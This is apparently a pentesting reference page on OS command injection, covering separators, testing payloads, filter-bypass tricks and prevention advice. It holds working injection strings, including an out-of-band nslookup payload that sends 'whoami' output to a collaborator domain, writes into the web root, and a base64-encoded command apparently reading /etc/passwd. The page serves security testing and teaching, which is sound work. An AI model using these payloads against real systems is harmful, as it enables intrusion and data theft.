# Command Injection

## Overview

Command injection (also called OS command injection) vulnerabilities occur when an application passes unsanitized user input to a system shell. An attacker can inject additional commands that are executed with the privileges of the web application process.

This is one of the most severe web vulnerabilities because it often leads to full system compromise.

## Attack Surface

- Features that execute system commands based on user input (ping tools, WHOIS lookups, image processing with tools like ImageMagick, PDF generation, etc.)
- Any functionality using functions like `system()`, `exec()`, `shell_exec()`, `popen()` in PHP, or `os.system()`, `subprocess` in Python without proper escaping.

## Identification

- Identify functionality that interacts with the operating system or external commands.
- Test by injecting command separators and simple commands (e.g., `& echo test &` or `; id`).
- Use time-based detection for blind injections (`ping -c 10 127.0.0.1` or equivalent).
- Write output to files that can be retrieved via other means (web root, then request the file).
- Use out-of-band (OAST) techniques with DNS/HTTP callbacks (nslookup to collaborator domain).

## Exploitation

### Useful OS Commands

| Purpose              | Linux          | Windows             |
|----------------------|----------------|---------------------|
| Current user         | whoami         | whoami              |
| OS version           | uname -a       | ver                 |
| Network config       | ifconfig       | ipconfig /all       |
| Network connections  | netstat -an    | netstat -an         |
| Running processes    | ps -ef         | tasklist            |

### Command Separators

| Separator | OS              | Notes |
|-----------|-----------------|-------|
| `&`       | Windows & Unix  | Runs both |
| `&&`      | Windows & Unix  | Runs second only if first succeeds |
| `\|`      | Windows & Unix  | Pipes output; second shown |
| `\|\|`    | Windows & Unix  | Runs second only if first fails |
| `;`       | Unix            | Runs both |
| Newline   | Unix            | `0x0a` or `\n` |
| `` `cmd` `` | Unix          | Command substitution |
| `$(cmd)`  | Unix            | Command substitution |

### Testing Techniques

- Simple injection: `& echo aiwefwlguh &`
- Blind/time-based: `& ping -c 10 127.0.0.1 &` or `||ping+-c+10+127.0.0.1||`
- Write to file for verification: `||whoami+>+/var/www/images/whoami.txt||` then retrieve via web request.
- OAST: `||nslookup+`whoami`.collaborator.example.com||`

### Advanced Bypasses (from detailed notes)

**Space bypasses (Linux):**
- `%09` (tab)
- `${IFS}` or `$IFS`
- `{ls,-la}` (brace expansion)

**Character and case manipulation:**
- `c"a"t` or `$@`
- Case: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
- Reversal: `echo 'whoami' | rev`
- Base64: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk...)`

See PayloadsAllTheThings for extensive bypass collections.

## Impact

- Full remote code execution on the server
- Data exfiltration, modification, or deletion
- Lateral movement within the network
- Installation of persistent backdoors or malware
- Complete takeover of the underlying host

## Prevention

- Avoid calling OS commands from application code whenever possible.
- Use safe APIs and libraries instead of shells.
- If shell commands are required, use parameterized APIs or proper escaping functions provided by the language.
- Strictly validate and sanitize all input (whitelisting is preferred).
- Run the application with the lowest possible privileges.
- Implement WAF rules and monitoring for suspicious command patterns.

## Tools & Payloads

- Burp Repeater and Intruder for testing separators and payloads
- Netcat or Burp Collaborator for OAST verification
- ffuf or custom scripts for blind exploitation

**Example OAST payload (adapt domain):**
```bash
||nslookup `whoami`.your-collaborator-id.oastify.com||
```

**Writing output for blind verification:**
```bash
||whoami > /var/www/html/whoami.txt||
# Then visit http://target/whoami.txt
```

For more bypasses and payloads, refer to:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

See the [File Upload Attacks](file-upload-attacks.md) page for related techniques when shells are delivered via uploads.
